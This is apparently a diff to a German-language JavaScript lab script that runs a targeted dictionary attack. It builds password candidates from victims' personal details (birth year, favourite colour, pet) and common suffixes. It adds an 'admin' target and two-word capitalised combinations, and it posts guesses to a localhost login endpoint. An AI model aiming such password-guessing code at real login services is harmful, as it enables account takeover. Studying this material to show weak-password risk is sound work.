@@ -1,5 +1,7 @@
 "use strict";
 
+const {login} = require("./login");
+
 const haeufigeZusaetze = ["", "1", "123", "!", "2010", "2024", "99", "2023", "2022", "2021", "2020", "2000", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", "2009"];
 
 const opferDaten = [
@@ -43,6 +45,16 @@ const opferDaten = [
             lieblingsfarbe: "rot",
             lieblingstier: "Katze",
         }
+    },
+    {
+        username: "admin",
+        daten: {
+            vorname: "Admin",
+            nachname: "User",
+            geburtsjahr: "1980",
+            lieblingsfarbe: "schwarz",
+            lieblingstier: "Drache",
+        }
     }
 ]
 
@@ -68,25 +80,23 @@ function erzeugeKandidaten(daten, zusaetze) {
     }
   }
 
-  return [...kandidaten];
-}
-
-async function login(nutzer, versuch) {
-    const response = await fetch("http://localhost:3000/api/auth/login", {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-            username: nutzer,
-            password: versuch,
-        }),
-    });
-
-    if (response.status === 429) {
-        throw new Error("Rate limit exceeded. Please try again later.");
+  for (const wort1 of bausteine) {
+    for (const wort2 of bausteine) {
+      if (wort1 !== wort2) {
+        const varianten1 = kapitalisierungsVarianten(wort1);
+        const varianten2 = kapitalisierungsVarianten(wort2);
+        for (const variante1 of varianten1) {
+          for (const variante2 of varianten2) {
+            for (const zusatz of zusaetze) {
+              kandidaten.add(variante1 + variante2 + zusatz);
+            }
+          }
+        }
+      }
     }
-    return response.status === 200;
+  }
+
+  return [...kandidaten];
 }
 
 async function dictionaryAngriff(nutzer, kandidaten) {
